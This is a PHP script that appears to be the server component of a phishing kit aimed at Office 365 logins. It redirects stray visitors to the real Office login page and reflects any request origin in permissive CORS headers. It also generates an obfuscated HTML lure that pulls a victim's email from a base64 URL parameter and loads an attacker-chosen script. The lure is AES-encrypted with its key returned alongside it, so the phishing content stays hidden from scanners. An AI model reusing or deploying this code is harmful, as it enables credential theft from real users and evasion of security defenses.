<?php
error_reporting(0);

$data = json_decode(file_get_contents('php://input'), true);

if (!$data) {
    header('Location: https://office.com/login');
    exit;
}

function randomString($length = 32)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

if (isset($_SERVER['HTTP_ORIGIN'])) {
    header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
    header('Access-Control-Allow-Credentials: true');
    header('Access-Control-Max-Age: 86400');
}

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
        header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");
    exit(0);
}

$code = '<!DOCTYPE html>
<html lang="en">

<head>
    <!-- <span>${kalimat1}</span> -->
</head>
<!-- <p>${kalimat2}</p> -->
<body>
    <script>
        let ${grabber} = ${grab_with_js};
        const ${kata1} = (${kata2}) => {
            ${kata2} = ${kata2}.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
            var ${kata3} = new RegExp("[\\?&]" + ${kata2} + "=([^&#]*)");
            var ${kata4} = ${kata3}.exec(location.search); // ${kalimat3}
            return ${kata4} === null ? "" : decodeURIComponent(${kata4}[1].replace(/\+/g, " "));
        } //${kalimat4}

        ${grabber} = ${kata1}("e") == "" ? ${grabber} : ${kata1}("e");
        ${grabber} = atob(${grabber});
    </script> <!-- <p>${kalimat6}</p> -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script><!-- <p>${kalimat7}</p> -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <!-- <span>${kalimat8}</span> -->
    <script src="${page_attach_js}"></script>
</body>

</html>';

$salt = randomString(128);
$password = randomString(16);

$keyIv = hash_pbkdf2('sha512', $password, $salt, 999, 48, true);

$key = substr($keyIv, 0, 32);
$iv = substr($keyIv, 32, 16);

$encrypted = openssl_encrypt($code, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
$encrypted = base64_encode($encrypted);

echo json_encode([
    'a' => $encrypted,
    'b' => $salt,
    'c' => bin2hex($iv),
    'd' => $password
]);
